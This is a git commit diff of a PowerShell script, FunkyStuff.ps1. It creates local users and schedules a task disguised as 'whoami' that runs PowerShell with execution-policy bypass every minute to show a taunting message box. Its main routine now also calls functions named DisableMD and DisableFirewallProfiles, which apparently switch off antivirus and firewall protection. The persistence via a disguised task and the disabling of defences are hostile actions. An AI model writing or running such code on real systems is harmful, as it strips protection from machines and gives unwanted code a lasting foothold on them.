4a443c7233b132c3a188fb0bcf72556e73dcff04
Austin Worline <89433963+0xAWorline@users.noreply.github.com>
2022-11-02 01:49:50 -0400

    Expanded documentation and fixed certain functions

--- FunkyStuff.ps1
+++ FunkyStuff.ps1
@@ -22,16 +22,15 @@ function CreateLocalUsers(){
 }
 
 function TaskCreation(){
-    schtasks /create /tn myfunnyTask /tr "powershell -NoLogo -WindowStyle hidden -file hmm.ps1" /sc minute /mo 1 /ru IEUser
+    schtasks /create /tn whoami /tr "powershell -ExecutionPolicy Bypass -Command ""&" {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"" /sc minute /mo 1 /ru IEUser
 }
-
+# powershell -ExecutionPolicy Bypass -Command "&" "{[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"
 # function AnnoyingAlert(){
 #    #$timeinSec = New-TimeSpan -Seconds 120
 #         $trigger = New-JobTrigger -Once -At 2:33PM -RepetitionInterval (New-TimeSpan -minutes 2) -RepeatIndefinitely
 #         Register-ScheduledJob -Name "funky thingies" -Trigger $trigger -ScriptBlock {
 #         powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"
 #       }
-#      schtasks /create /tn testinggg /tr "powershell -Command ""&" {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"" /sc minute /mo 1 /ru IEUser
 #     #Register-ScheduledJob -Name "funky thingie" -RunEvery $timeinSec -FilePath C:\Users\IEUser\Documents\Scripts\hmm.ps1
 # }
 
@@ -56,7 +55,10 @@ function Main(){
         CreateLocalUsers $user
     }
 
-    AnnoyingAlert
+    DisableMD
+    DisableFirewallProfiles
+    TaskCreation
+    SetMemeAliases
 
 }
 
